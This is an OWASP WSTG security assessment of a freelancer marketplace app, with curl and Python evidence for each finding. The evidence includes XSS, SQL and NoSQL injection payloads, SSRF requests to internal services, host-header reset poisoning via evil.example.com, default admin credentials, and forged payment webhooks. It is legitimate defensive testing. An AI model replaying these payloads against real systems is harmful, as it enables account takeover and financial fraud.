# OWASP WSTG Security Test Plan — HireFlow

This test plan is based on the [OWASP Web Security Testing Guide (WSTG)](https://owasp.org/www-project-web-security-testing-guide/)
checklist, tailored to a freelancer marketplace web application.

## Status Legend

- `[ ]` = pending
- `[~]` = in progress
- `[x]` = done — finding confirmed
- `[-]` = done — not vulnerable / not applicable
- `[?]` = inconclusive, needs more investigation

All checklist items below are now resolved. Evidence and PoCs are stored
under `reports/pocs/`.

---

## INFO — Information Gathering

- [-] WSTG-INFO-01: Search engine discovery and reconnaissance
  > Probed `/robots.txt`, `/sitemap.xml`, and `/.well-known/security.txt`; each fell through to the SPA shell instead of exposing crawler metadata or hidden paths.

- [x] WSTG-INFO-02: Fingerprint web server
  > Identified Express behind Vite-served frontend assets with Helmet defaults.
  > Evidence:
  > ```bash
  > curl -i -s http://localhost:3000/ | sed -n '1,25p'
  > ```
  > Response excerpt: `Strict-Transport-Security`, `X-Frame-Options: SAMEORIGIN`, `Content-Type: text/html`, and `/assets/index-*.js`.

- [-] WSTG-INFO-03: Review webserver metafiles for information leakage
  > Probed `/.env`, `/.git/HEAD`, and `/package.json`; raw files were not exposed over the web root.

- [x] WSTG-INFO-04: Enumerate applications on webserver
  > **Finding: Exposed Adjacent Admin Services**
  > **Severity**: High
  > **Source**: `docker-compose.yml:64-94`
  > **Endpoints**: `GET http://localhost:8025/`, `GET http://localhost:9001/`
  > **Description**: MailHog and the MinIO console are reachable from the assessment host. The compose file also hardcodes MinIO credentials.
  > **Evidence**:
  > ```bash
  > curl -i -s http://localhost:8025/ | sed -n '1,10p'
  > curl -i -s http://localhost:9001/ | sed -n '1,10p'
  > ```
  > Response excerpts: `HTTP/1.1 200 OK` with `MailHog`; `HTTP/1.1 200 OK` with `Server: MinIO Console`.
  > **Impact**: Attackers with network reachability can read reset/verification emails and reach storage admin surfaces.
  > **PoC**: `reports/pocs/WSTG-CONF-01_exposed-services.py`

- [x] WSTG-INFO-05: Review webpage content for information leakage
  > **Finding: Unauthenticated Debug Endpoint**
  > **Severity**: Medium
  > **Source**: `src/index.js:100-113`
  > **Endpoint**: `GET /api/debug/info`
  > **Description**: A diagnostic endpoint leaks runtime internals including Node version, environment, PID, memory usage, and internal hostnames.
  > **Evidence**:
  > ```bash
  > curl -i -s http://localhost:3000/api/debug/info
  > ```
  > Response excerpt: `{"node_version":"v20.20.2","environment":"development","db_host":"postgres","redis_host":"redis","mongo_uri":"mongodb://mongodb:27017/hireflow"}`
  > **PoC**: `reports/pocs/WSTG-INFO-05_debug-info.py`

- [-] WSTG-INFO-06: Identify application entry points
  > Mapped major API entry points from `src/index.js:80-93`, including auth, users, gigs, projects, proposals, contracts, payments, messages, reviews, disputes, notifications, admin, webhooks, uploads, and Socket.IO.

- [-] WSTG-INFO-07: Map execution paths through application
  > Traced the core workflows in source and live traffic: registration -> login -> proposal -> contract -> escrow funding -> deliverable submission -> approval/release -> review.

- [-] WSTG-INFO-08: Fingerprint web application framework
  > Source review confirms Express 4 + Helmet + Redis-backed `express-session` on the backend and Vite/React on the frontend (`src/index.js:46-78`).

- [-] WSTG-INFO-09: Fingerprint web application
  > No application version string or public build metadata was disclosed through `/api/health`, static assets, or common status paths.

- [-] WSTG-INFO-10: Map application architecture
  > Architecture mapped: PostgreSQL, Redis, MongoDB, MinIO, MailHog, Express, Socket.IO, React/Vite. Auth supports both Redis-backed sessions and JWT bearer tokens (`src/index.js:60-71`, `src/middleware/auth.js:5-40`).

---

## CONF — Configuration and Deployment Management

- [x] WSTG-CONF-01: Test network/infrastructure configuration
  > Finding recorded under `WSTG-INFO-04`: exposed MailHog on `8025` and MinIO console on `9001`.

- [x] WSTG-CONF-02: Test application platform configuration
  > Development deployment confirmed from `GET /api/debug/info`. CSP is disabled and verbose errors are enabled, both tracked separately below.

- [x] WSTG-CONF-03: Test file extension handling for sensitive information
  > **Finding: HTML Deliverables Are Accepted and Served as Active Content**
  > **Severity**: High
  > **Source**: `src/middleware/upload.js:49-52`, `src/index.js:76-78`
  > **Endpoint**: `POST /api/contracts/:id/milestones/:milestoneId/submit` -> `GET /uploads/<uuid>.html`
  > **Description**: Deliverable uploads have no file-type restrictions and are served directly from the application origin with the browser-chosen content type.
  > **Evidence**:
  > ```bash
  > curl -i -s -H 'Authorization: Bearer <freelancer-token>' \
  >   -F 'files=@/tmp/wstg-upload.html;type=text/html' \
  >   -F 'message=html deliverable' \
  >   http://localhost:3000/api/contracts/0bcdcbea-adcc-47c6-9684-3a2327dac333/milestones/73efd8f7-8e88-4b94-8fde-136d7b019899/submit
  > curl -i -s http://localhost:3000/uploads/0716b0fb-35d3-4de4-a4dd-5af64ea68f60.html
  > ```
  > Response excerpt: deliverable path `/uploads/...html`; fetched file returned `200 OK`, `Content-Type: text/html; charset=UTF-8`.
  > **Impact**: Uploaded HTML executes in the application origin if visited.
  > **PoC**: `reports/pocs/WSTG-CONF-03_html-upload.py`

- [-] WSTG-CONF-04: Review old/backup/unreferenced files
  > `/.env`, `/.git/HEAD`, and related backup-style paths returned the SPA shell rather than raw files.

- [-] WSTG-CONF-05: Enumerate admin interfaces
  > Enumerated `/api/admin/*` from `src/admin/admin.routes.js`. Sampled RBAC behaved as designed: client -> `/api/admin/users` returned `403`, moderator -> `/api/admin/dashboard` returned `200`, moderator -> `/api/admin/users` returned `403`, admin -> `/api/admin/audit-log` returned `403`, superadmin -> `/api/admin/audit-log` returned `200`.

- [-] WSTG-CONF-06: Test HTTP methods
  > `OPTIONS /api/contracts/<id>` returned `204` with `Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE`, but unsupported method tampering such as `PATCH /api/contracts/<id>/status` returned `404` and no authz bypass was observed.

- [-] WSTG-CONF-07: Test HTTP Strict Transport Security
  > `Strict-Transport-Security: max-age=15552000; includeSubDomains` is present on application responses.

- [x] WSTG-CONF-08: Test cross-domain policy (CORS)
  > **Finding: Reflected CORS with Credentials Enables Cross-Site State Changes**
  > **Severity**: High
  > **Source**: `src/index.js:46-49`
  > **Endpoints**: all `/api/*` routes using session auth
  > **Evidence**:
  > ```bash
  > curl -i -s -H 'Origin: https://evil.example.com' http://localhost:3000/api/health
  > curl -i -s -b /tmp/hf-client.cookies \
  >   -H 'Origin: https://evil.example.com' \
  >   -H 'Content-Type: application/json' \
  >   -X PUT \
  >   -d '{"display_name":"CSRF_From_Evil_Origin"}' \
  >   http://localhost:3000/api/users/5664b7f1-dc57-4aac-a3f1-2ec59d7915f9
  > ```
  > Response excerpts: `Access-Control-Allow-Origin: https://evil.example.com`, `Access-Control-Allow-Credentials: true`, and `200 OK` on the update.
  > **PoC**: `reports/pocs/WSTG-SESS-05_csrf-cors.py`

- [x] WSTG-CONF-09: Test file permissions
  > Finding recorded under `WSTG-CONF-03`: uploaded files are reachable under `/uploads` on the main origin without indirection or authz controls.

- [x] WSTG-CONF-11: Test cloud/object storage
  > **Finding: Public Upload Directory Listing**
  > **Severity**: Medium
  > **Source**: `src/index.js:76-78`
  > **Endpoint**: `GET /uploads/`
  > **Evidence**:
  > ```bash
  > curl -i -s http://localhost:3000/uploads/ | sed -n '1,20p'
  > ```
  > Response excerpt: `HTTP/1.1 200 OK` and `<title>listing directory /uploads/</title>`.
  > **PoC**: `reports/pocs/WSTG-CONF-11_uploads-listing.py`

- [x] WSTG-CONF-12: Test Content Security Policy
  > **Finding: CSP Disabled**
  > **Severity**: Low
  > **Source**: `src/index.js:50-53`
  > **Evidence**:
  > ```bash
  > curl -i -s http://localhost:3000/ | sed -n '1,20p'
  > ```
  > Response headers include no `Content-Security-Policy`.
  > **PoC**: `reports/pocs/WSTG-CONF-12_missing-csp.py`

- [-] WSTG-CONF-14: Test other HTTP security header misconfigurations
  > `X-Content-Type-Options`, `X-Frame-Options`, and `Referrer-Policy` are present. CSP weakness is tracked under `WSTG-CONF-12`.

---

## IDNT — Identity Management

- [-] WSTG-IDNT-01: Test role definitions
  > Role definitions sampled correctly: client/freelancer cannot reach admin routes; moderator can reach moderator routes but not admin-only routes; superadmin can reach `/api/admin/audit-log`.

- [-] WSTG-IDNT-02: Test user registration process
  > Registration rejected `role=admin` with `400 Role must be client or freelancer`. Duplicate email returned `409`, and self-registration only permits `client` or `freelancer`.

- [x] WSTG-IDNT-03: Test account provisioning process
  > **Finding: Registration Immediately Issues an Authenticated JWT Before Email Verification**
  > **Severity**: Medium
  > **Source**: `src/auth/auth.controller.js:27-59`, `src/auth/auth.service.js:68-81`
  > **Endpoint**: `POST /api/auth/register`
  > **Evidence**:
  > ```bash
  > curl -i -s -H 'Content-Type: application/json' \
  >   -d '{"email":"wstg_idnt03@example.com","username":"wstgidnt03","password":"aaaaaaaa","display_name":"WSTG"}' \
  >   http://localhost:3000/api/auth/register
  > ```
  > Response excerpt: `201 Created` with `"token":"eyJ..."` and `"email_verified":false`.
  > **PoC**: `reports/pocs/WSTG-IDNT-03_unverified-jwt.py`

- [x] WSTG-IDNT-04: Test account enumeration
  > **Finding: Password Reset Endpoint Enumerates Valid Accounts**
  > **Severity**: Low
  > **Source**: `src/auth/auth.controller.js:133-155`
  > **Endpoint**: `POST /api/auth/forgot-password`
  > **Evidence**:
  > ```bash
  > curl -i -s -H 'Content-Type: application/json' \
  >   -d '{"email":"testclient@hireflow.com"}' \
  >   http://localhost:3000/api/auth/forgot-password
  > curl -i -s -H 'Content-Type: application/json' \
  >   -d '{"email":"doesnotexist_20260331@hireflow.com"}' \
  >   http://localhost:3000/api/auth/forgot-password
  > ```
  > Response excerpts: `200 OK {"message":"Password reset link sent to your email"}` vs `404 Not Found {"message":"No account found with that email address"}`.
  > **PoC**: `reports/pocs/WSTG-IDNT-04_account-enum.py`

- [-] WSTG-IDNT-05: Test username/email policy
  > `src/auth/auth.routes.js:8-24` enforces 3-30 usernames, alphanumeric/underscore/hyphen only, and normalizes email. A case-variant duplicate registration returned `409 Email already registered`.

---

## ATHN — Authentication

- [x] WSTG-ATHN-01: Test credentials over encrypted channel
  > **Finding: Login Is Exposed Over Plain HTTP**
  > **Severity**: High
  > **Source**: `src/auth/auth.routes.js:26-33`, `src/index.js:40-43`
  > **Endpoint**: `POST http://localhost:3000/api/auth/login`
  > **Evidence**:
  > ```bash
  > curl -i -s -H 'Content-Type: application/json' \
  >   -d '{"email":"testfreelancer@hireflow.com","password":"password123"}' \
  >   http://localhost:3000/api/auth/login
  > ```
  > Response excerpt: `200 OK` with a JWT over cleartext HTTP.
  > **PoC**: `reports/pocs/WSTG-ATHN-01_http-auth.py`

- [x] WSTG-ATHN-02: Test for default credentials
  > **Finding: Seeded Privileged Accounts Still Use the Default Password**
  > **Severity**: High
  > **Source**: `seeds/001_seed_data.js:29`, `seeds/001_seed_data.js:86-118`
  > **Evidence**:
  > ```bash
  > curl -i -s -H 'Content-Type: application/json' \
  >   -d '{"email":"bob.admin@hireflow.com","password":"password123"}' \
  >   http://localhost:3000/api/auth/login
  > curl -i -s -H 'Content-Type: application/json' \
  >   -d '{"email":"alice.admin@hireflow.com","password":"password123"}' \
  >   http://localhost:3000/api/auth/login
  > ```
  > Response excerpts: both returned `200 OK` with live bearer tokens.
  > **Impact**: The deployment exposes admin and superadmin accounts with known seeded credentials.
  > **PoC**: `reports/pocs/WSTG-ATHN-02_default-credentials.py`

- [x] WSTG-ATHN-03: Test lockout mechanism
  > **Finding: No Effective Brute-Force Lockout on Login**
  > **Severity**: Medium
  > **Source**: `src/middleware/rateLimiter.js:12-19`, `src/auth/auth.routes.js:26-33`
  > **Evidence**:
  > ```bash
  > python3 - <<'PY'
  > import requests
  > for i in range(1, 26):
  >     r = requests.post('http://localhost:3000/api/auth/login',
  >         json={'email':'testclient@hireflow.com','password':'wrongpass'})
  >     print(i, r.status_code)
  > PY
  > ```
  > Attempts `1` through `25` all returned `401`; no `429` or lockout state was observed.
  > **PoC**: `reports/pocs/WSTG-ATHN-03_no-lockout.py`

- [-] WSTG-ATHN-04: Test authentication bypass
  > `Authorization: Bearer null`, `Bearer undefined`, malformed JWTs, `alg:none`, and expired JWTs all returned `401 {"error":"Invalid or expired token"}` on `/api/auth/me`.

- [x] WSTG-ATHN-05: Test remember-password / persistent login
  > **Finding: Bearer Tokens Remain Valid After a Password Reset**
  > **Severity**: High
  > **Source**: `src/auth/auth.service.js:68-81`, `src/auth/auth.service.js:132-139`, `src/middleware/auth.js:20-40`
  > **Description**: Password changes update `password_hash` but there is no token versioning, blacklist, or revocation check in JWT auth.
  > **Evidence**:
  > ```bash
  > # register -> save JWT -> reset password -> reuse original JWT
  > curl -i -s -H 'Authorization: Bearer <pre-reset-jwt>' http://localhost:3000/api/auth/me
  > ```
  > Response excerpt after reset: `200 OK` with the user object.
  > **PoC**: `reports/pocs/WSTG-ATHN-05_jwt-survives-reset.py`

- [x] WSTG-ATHN-07: Test password policy
  > **Finding: Weak Dictionary Password Accepted**
  > **Severity**: Medium
  > **Source**: `src/auth/auth.routes.js:17-19`, `src/auth/auth.controller.js:169-170`
  > **Endpoint**: `POST /api/auth/register`
  > **Evidence**:
  > ```bash
  > curl -i -s -H 'Content-Type: application/json' \
  >   -d '{"email":"wstg_weakpw@example.com","username":"wstgweakpw","password":"aaaaaaaa","display_name":"Weak Password"}' \
  >   http://localhost:3000/api/auth/register
  > ```
  > Response excerpt: `201 Created`.
  > **PoC**: `reports/pocs/WSTG-ATHN-07_weak-password.py`

- [x] WSTG-ATHN-09: Test password reset functionality
  > **Finding: Password Reset Links Trust the Host Header and Tokens Are Reusable**
  > **Severity**: High
  > **Source**: `src/auth/auth.controller.js:140-151`, `src/auth/auth.controller.js:173-190`, `src/auth/auth.service.js:114-139`
  > **Evidence**:
  > ```bash
  > curl -i -s -H 'Host: evil.example.com' -H 'Content-Type: application/json' \
  >   -d '{"email":"wstg.8cdbdcbb@example.com"}' \
  >   http://localhost:3000/api/auth/forgot-password
  > ```
  > MailHog message excerpt: `http://evil.example.com/reset-password?token=mnenff0i-df76e8938d88d01d`
  > Reuse evidence:
  > ```bash
  > curl -i -s -H 'Content-Type: application/json' \
  >   -d '{"token":"mnenff0i-df76e8938d88d01d","password":"newpass123"}' \
  >   http://localhost:3000/api/auth/reset-password
  > curl -i -s -H 'Content-Type: application/json' \
  >   -d '{"token":"mnenff0i-df76e8938d88d01d","password":"newpass456"}' \
  >   http://localhost:3000/api/auth/reset-password
  > ```
  > Both responses returned `200 OK`.
  > **PoC**: `reports/pocs/WSTG-ATHN-09_reset-flaws.py`

- [x] WSTG-ATHN-10: Test alternative auth channels
  > **Finding: Payment Webhook Accepts Unsigned Requests**
  > **Severity**: Critical
  > **Source**: `src/integrations/webhook.routes.js:11-19`, `src/integrations/webhook.service.js:17-29`, `src/integrations/webhook.service.js:31-64`
  > **Endpoint**: `POST /api/webhooks/payment`
  > **Description**: Signature verification is optional. If the `x-payment-signature` header is omitted, the webhook still credits wallets and records transactions.
  > **Evidence**:
  > ```bash
  > curl -i -s -H 'Content-Type: application/json' \
  >   -d '{"event":"payment.completed","data":{"user_id":"5664b7f1-dc57-4aac-a3f1-2ec59d7915f9","amount":1,"description":"unsigned webhook test 2"}}' \
  >   http://localhost:3000/api/webhooks/payment
  > ```
  > Response: `200 OK {"received":true,"result":{"processed":true,"event":"payment.completed"}}`
  > Wallet evidence: client balance changed from `110010102157574` to `110010102157575`.
  > **PoC**: `reports/pocs/WSTG-ATHN-10_unsigned-webhook.py`

- [-] WSTG-ATHN-11: Test multi-factor authentication
  > No MFA flow exists in the application or frontend.

---

## ATHZ — Authorization

- [-] WSTG-ATHZ-01: Test directory traversal / file include
  > `/uploads/%2e%2e/package.json` returned `403 Forbidden`, `/uploads/../package.json` fell through to the SPA shell, and `file:///etc/passwd` import attempts failed. No traversal or local-file include was confirmed.

- [x] WSTG-ATHZ-02: Test authorization schema bypass
  > **Finding: Contract Mutation Endpoints Lack Role and Ownership Checks**
  > **Severity**: High
  > **Source**: `src/contracts/contracts.routes.js:7-21`, `src/contracts/contracts.controller.js:66-120`, `src/contracts/contracts.service.js:136-227`
  > **Evidence**:
  > ```bash
  > curl -i -s -X POST -H 'Authorization: Bearer <moderator-token>' \
  >   -H 'Content-Type: application/json' \
  >   -d '{"title":"Moderator extra milestone","amount":77}' \
  >   http://localhost:3000/api/contracts/29c1f280-a139-4f25-8b90-1bf2ad2ff068/milestones
  > ```
  > Response excerpt: `201 Created` with a new milestone on another users' contract.
  > **PoC**: `reports/pocs/WSTG-ATHZ-03_contract-mutation.py`

- [x] WSTG-ATHZ-03: Test privilege escalation
  > Finding recorded under `WSTG-ATHZ-02`: lower-privilege authenticated users can mutate other users' contracts and milestones.

- [x] WSTG-ATHZ-04: Test insecure direct object references (IDOR)
  > **Finding: Unauthenticated User Settings Disclosure**
  > **Severity**: High
  > **Source**: `src/users/users.routes.js:15`, `src/users/users.service.js:75-83`
  > **Evidence**:
  > ```bash
  > curl -i -s http://localhost:3000/api/users/3fcfb3b4-8335-4b13-b813-3d425c3ecf7e/settings
  > ```
  > Response excerpt: `200 OK` with `email`, `timezone`, `bio`, `email_verified`, `last_login`.
  >
  > **Finding: Cross-Account Contract Disclosure**
  > **Severity**: High
  > **Source**: `src/contracts/contracts.controller.js:28-35`, `src/contracts/contracts.service.js:65-77`
  > **Evidence**:
  > ```bash
  > curl -i -s -H 'Authorization: Bearer <moderator-token>' \
  >   http://localhost:3000/api/contracts/738a6a2b-9b71-4147-9959-0e206137a9f1
  > ```
  > Response excerpt: `200 OK` with `client_id`, `freelancer_id`, milestones.
  >
  > **Finding: Proposal Listing BOLA**
  > **Severity**: Medium
  > **Source**: `src/proposals/proposals.controller.js:9-25`, `src/proposals/proposals.service.js:11-59`
  > **Evidence**:
  > ```bash
  > curl -i -s -H 'Authorization: Bearer <client-token>' \
  >   'http://localhost:3000/api/proposals?freelancer_id=3fcfb3b4-8335-4b13-b813-3d425c3ecf7e'
  > ```
  > Response excerpt: `200 OK` with another user's proposals and `cover_letter`.
  >
  > **Finding: Conversation Read/Write IDOR**
  > **Severity**: High
  > **Source**: `src/messaging/messaging.controller.js:50-92`, `src/messaging/messaging.service.js:187-257`
  > **Evidence**:
  > ```bash
  > curl -i -s -H 'Authorization: Bearer <moderator-token>' \
  >   http://localhost:3000/api/messages/conversations/a26d2f91-7522-4f50-b24d-81c6af2d43e0
  > curl -i -s -H 'Authorization: Bearer <moderator-token>' -H 'Content-Type: application/json' \
  >   -d '{"content":"Moderator injected message"}' \
  >   http://localhost:3000/api/messages/conversations/a26d2f91-7522-4f50-b24d-81c6af2d43e0/messages
  > ```
  > Responses: `200 OK` on read and `201 Created` on injected write.
  > **PoC**: `reports/pocs/WSTG-ATHZ-04_idor-suite.py`

- [-] WSTG-ATHZ-05: Test OAuth weaknesses
  > No OAuth or social-login flow exists.

---

## SESS — Session Management

- [-] WSTG-SESS-01: Test session management schema
  > Hybrid auth scheme confirmed: Redis-backed `connect.sid` sessions plus JWT bearer tokens (`src/index.js:60-71`, `src/middleware/auth.js:5-40`).

- [x] WSTG-SESS-02: Test cookie attributes
  > **Finding: Session Cookie Missing `Secure` and `SameSite`**
  > **Severity**: Medium
  > **Source**: `src/index.js:62-70`
  > **Evidence**:
  > ```bash
  > curl -i -s -H 'Content-Type: application/json' \
  >   -d '{"email":"testfreelancer@hireflow.com","password":"password123"}' \
  >   http://localhost:3000/api/auth/login | sed -n '1,25p'
  > ```
  > Response excerpt: `Set-Cookie: connect.sid=...; Path=/; HttpOnly`
  > **PoC**: `reports/pocs/WSTG-SESS-02_cookie-attrs.py`

- [-] WSTG-SESS-03: Test session fixation
  > Pre-setting a fake `connect.sid` before login resulted in a new session cookie being issued. No pre-auth session reuse was confirmed in this pass.

- [x] WSTG-SESS-04: Test exposed session variables
  > **Finding: JWT Contains Sensitive Profile and Financial Claims**
  > **Severity**: Low
  > **Source**: `src/auth/auth.service.js:68-81`
  > **Evidence**:
  > ```bash
  > python3 - <<'PY'
  > import base64, json
  > jwt = '<freelancer-token>'
  > p = jwt.split('.')[1] + '=' * (-len(jwt.split('.')[1]) % 4)
  > print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))
  > PY
  > ```
  > Response excerpt: `{"email":"testfreelancer@hireflow.com","walletBalance":"10000000000130277",...}`
  > **PoC**: `reports/pocs/WSTG-SESS-04_jwt-claims.py`

- [x] WSTG-SESS-05: Test CSRF protection
  > Finding recorded under `WSTG-CONF-08`: cross-site credentialed requests succeeded against `PUT /api/users/:id` with only the victim session cookie.

- [x] WSTG-SESS-06: Test logout functionality
  > **Finding: Logout Does Not Revoke Existing JWTs**
  > **Severity**: Medium
  > **Source**: `src/auth/auth.controller.js:111-123`, `src/middleware/auth.js:20-40`
  > **Evidence**:
  > ```bash
  > curl -i -s -b /tmp/hf-logout.cookies -X POST http://localhost:3000/api/auth/logout
  > curl -i -s -b /tmp/hf-logout.cookies http://localhost:3000/api/auth/me
  > curl -i -s -H 'Authorization: Bearer <fresh-freelancer-token>' http://localhost:3000/api/auth/me
  > ```
  > Response excerpts: cookie session returned `401`, but the JWT still returned `200 OK`.
  > **PoC**: `reports/pocs/WSTG-SESS-06_logout-jwt.py`

- [-] WSTG-SESS-07: Test session timeout
  > Session cookies are browser-session scoped and JWTs expire after 7 days (`exp - iat = 604800`). No additional idle-timeout flaw beyond the revocation gap above was confirmed.

- [-] WSTG-SESS-09: Test session hijacking
  > No separate anti-hijacking control failure beyond bearer-token portability, missing `Secure`/`SameSite`, and localStorage token storage was confirmed.

- [-] WSTG-SESS-10: Test JSON Web Tokens
  > `alg:none`, malformed, expired, and candidate weak-secret forged tokens were rejected with `401`. Sensitive claims are tracked under `WSTG-SESS-04`.

- [-] WSTG-SESS-11: Test concurrent sessions
  > Concurrent sessions are allowed, but no additional security flaw beyond the JWT revocation gap was confirmed.

---

## INPV — Input Validation

- [-] WSTG-INPV-01: Test reflected XSS
  > Reflected query parameters on sampled endpoints returned JSON only; no unsafe HTML reflection was confirmed in this pass.

- [x] WSTG-INPV-02: Test stored XSS
  > **Finding: Review Comments Are Stored Unsanitized and Rendered With `dangerouslySetInnerHTML`**
  > **Severity**: High
  > **Source**: `src/reviews/reviews.service.js:145-159`, `client/src/pages/GigDetail.jsx:298-299`
  > **Description**: Review comments are stored verbatim and later rendered into the DOM as raw HTML.
  > **Evidence**:
  > ```bash
  > curl -i -s -H 'Authorization: Bearer <admin-token>' -H 'Content-Type: application/json' \
  >   -d '{"contract_id":"29c1f280-a139-4f25-8b90-1bf2ad2ff068","reviewee_id":"3fcfb3b4-8335-4b13-b813-3d425c3ecf7e","rating":5,"comment":"<img src=x onerror=alert(1)>wstg-stored-review"}' \
  >   http://localhost:3000/api/reviews
  > curl -s http://localhost:3000/api/reviews/e7c61b36-97f1-4034-b5d9-1b50d3fa7ab9 | jq -r '.comment'
  > ```
  > Response excerpt: `<img src=x onerror=alert(1)>wstg-stored-review`
  > **PoC**: `reports/pocs/WSTG-INPV-02_stored-review-xss.py`

- [-] WSTG-INPV-03: Test HTTP verb tampering
  > `PATCH /api/contracts/<id>/status` returned `404 Route ... not found`; no method-based authz bypass was observed.

- [-] WSTG-INPV-04: Test HTTP parameter pollution
  > Sampled duplicate query parameters such as `GET /api/users?role=client&role=admin` did not produce an authz bypass or broadened result set.

- [x] WSTG-INPV-05: Test SQL injection
  > **Finding: SQL Injection in Public User Search**
  > **Severity**: High
  > **Source**: `src/users/users.service.js:21-45`
  > **Endpoint**: `GET /api/users?search=...`
  > **Evidence**:
  > ```bash
  > curl -i -s 'http://localhost:3000/api/users?search=%27%20OR%201%3D1%20--'
  > ```
  > Response excerpt: `500 Internal Server Error {"error":"Failed to fetch users"}`
  > **PoC**: `reports/pocs/WSTG-INPV-05_sqli.py`

- [x] WSTG-INPV-06: Test NoSQL injection
  > **Finding: `tag_filter` Reaches a Mongo `$where` Clause**
  > **Severity**: Medium
  > **Source**: `src/gigs/gigs.service.js:39-46`
  > **Evidence**:
  > ```bash
  > curl -i -s 'http://localhost:3000/api/gigs?tag_filter=false'
  > curl -i -s 'http://localhost:3000/api/gigs?tag_filter=this.constructor.constructor(\"return process.version\")()'
  > ```
  > Response excerpts: `500 Internal Server Error {"error":"$where is not allowed in this context",...}`
  > **PoC**: `reports/pocs/WSTG-INPV-06_nosql-where.py`

- [x] WSTG-INPV-11: Test code injection
  > Finding recorded under `WSTG-INPV-06`: user input is interpolated into a server-side `$where` JavaScript expression.

- [-] WSTG-INPV-12: Test command injection
  > No command-execution sink was identified in uploads, image handling, or document generation; filenames were stored and served, not executed.

- [-] WSTG-INPV-15: Test HTTP splitting/smuggling
  > No CRLF/header injection or smuggling condition was confirmed in sampled endpoints.

- [x] WSTG-INPV-17: Test host header injection
  > Finding recorded under `WSTG-ATHN-09`: password reset URLs are built from `req.get('host')` and accepted `Host: evil.example.com`.
  > **PoC**: `reports/pocs/WSTG-ATHN-09_reset-flaws.py`

- [-] WSTG-INPV-18: Test server-side template injection
  > No SSTI-specific engine was present. Invoice generation in `src/utils/pdf.js` uses string interpolation into static HTML, not server-side template evaluation.

- [x] WSTG-INPV-19: Test SSRF
  > **Finding: Internal Services Reachable Through Import/Webhook URL Features**
  > **Severity**: High
  > **Source**: `src/integrations/webhook.routes.js:48-81`, `src/integrations/webhook.service.js:139-188`, `src/integrations/webhook.service.js:196-247`
  > **Evidence**:
  > ```bash
  > curl -i -s -H 'Authorization: Bearer <client-token>' \
  >   'http://localhost:3000/api/integrations/import?url=http://mailhog:8025/api/v2/messages'
  > curl -i -s -H 'Authorization: Bearer <client-token>' -H 'Content-Type: application/json' \
  >   -d '{"url":"http://mailhog:8025/api/v2/messages"}' \
  >   http://localhost:3000/api/webhooks/test
  > ```
  > Response excerpts: `200 OK {"imported":true,...}` and `200 OK {"success":false,"status":404,"response":"404 page not found\n"}`
  > **PoC**: `reports/pocs/WSTG-INPV-19_ssrf.py`

- [-] WSTG-INPV-20: Test mass assignment
  > Registration rejects privileged roles (`400 Role must be client or freelancer`), and profile/settings updates are field-whitelisted in `src/users/users.service.js:86-120`.

---

## ERRH — Error Handling

- [x] WSTG-ERRH-01: Test improper error handling
  > Database and validation errors bubble to clients with backend detail in multiple routes. See `WSTG-ERRH-02`.

- [x] WSTG-ERRH-02: Test stack traces
  > **Finding: Stack Traces Returned in 500 Responses**
  > **Severity**: Low
  > **Source**: `src/middleware/errorHandler.js:31-37`
  > **Endpoint**: multiple 500 paths, including `POST /api/contracts` and `GET /api/gigs?tag_filter=...`
  > **Evidence**:
  > ```bash
  > curl -i -s 'http://localhost:3000/api/gigs?tag_filter=false'
  > ```
  > Response excerpt includes `MongoServerError` stack frames and internal file paths.
  > **PoC**: `reports/pocs/WSTG-ERRH-02_stack-trace.py`

---

## CRYP — Cryptography

- [x] WSTG-CRYP-01: Test weak transport layer security
  > Finding recorded under `WSTG-ATHN-01`: the application is exposed only over plaintext HTTP in the assessment environment.
  > **PoC**: `reports/pocs/WSTG-ATHN-01_http-auth.py`

- [x] WSTG-CRYP-03: Test sensitive data sent via unencrypted channels
  > Finding recorded under `WSTG-SESS-04`: JWT payloads include email address and wallet balance.

- [x] WSTG-CRYP-04: Test weak cryptographic primitives
  > **Finding: Weak Password Hashing Cost and Predictable Reset Token Format**
  > **Severity**: Medium
  > **Source**: `src/auth/auth.service.js:7-8`, `src/auth/auth.controller.js:140-145`, `src/auth/auth.controller.js:180-185`
  > **Description**: Password hashes use bcrypt cost factor `4`. Reset tokens are timestamp-derived and accepted for 24 hours despite the email text and DB comment stating 1 hour.
  > **Evidence**:
  > ```bash
  > curl -s 'http://localhost:8025/api/v2/messages?limit=1' | jq -r '.items[0].Content.Body'
  > ```
  > Response excerpt contained a reset token like `mnenff0i-df76e8938d88d01d`.
  > **PoC**: `reports/pocs/WSTG-CRYP-04_weak-crypto.py`

---

## BUSL — Business Logic

- [x] WSTG-BUSL-01: Test business logic data validation
  > **Finding: Proposals Can Exceed the Project Budget by Arbitrary Amounts**
  > **Severity**: Medium
  > **Source**: `src/proposals/proposals.controller.js:39-59`, `src/proposals/proposals.service.js:66-102`
  > **Evidence**:
  > ```bash
  > curl -i -s -H 'Authorization: Bearer <freelancer-token>' -H 'Content-Type: application/json' \
  >   -d '{"project_id":"ff995e59-ea08-42e8-b3a9-a16a9e8ca4d5","cover_letter":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","bid_amount":1000199,"estimated_duration_days":7}' \
  >   http://localhost:3000/api/proposals
  > ```
  > Response excerpt: `201 Created` for a project whose `budget_max` was `200`.
  > **PoC**: `reports/pocs/WSTG-BUSL-01_overbudget-proposal.py`

- [x] WSTG-BUSL-02: Test ability to forge requests
  > **Finding: Escrow Release Amount Can Be Overridden by Request Body**
  > **Severity**: Critical
  > **Source**: `src/payments/payments.controller.js:76-89`, `src/payments/payments.service.js:204-242`
  > **Evidence**:
  > ```bash
  > curl -i -s -H 'Authorization: Bearer <client-token>' -H 'Content-Type: application/json' \
  >   -d '{"amount":2.00}' \
  >   http://localhost:3000/api/payments/escrow/release/a622ca53-6392-4cd8-8814-b247b37cb02b
  > ```
  > Wallet impact: client `pending_balance` fell from `475819` to `475619` and freelancer balance rose by `180`, even though the milestone amount was `100`.
  > **PoC**: `reports/pocs/WSTG-BUSL-02_release-override.py`

- [x] WSTG-BUSL-03: Test integrity checks
  > Finding recorded under `WSTG-ATHN-10`: unsigned webhook requests are processed as valid payment events.
  > **PoC**: `reports/pocs/WSTG-ATHN-10_unsigned-webhook.py`

- [x] WSTG-BUSL-04: Test process timing
  > **Finding: Concurrent Escrow Releases Double-Spend the Same Milestone**
  > **Severity**: Critical
  > **Source**: `src/payments/payments.service.js:204-292`
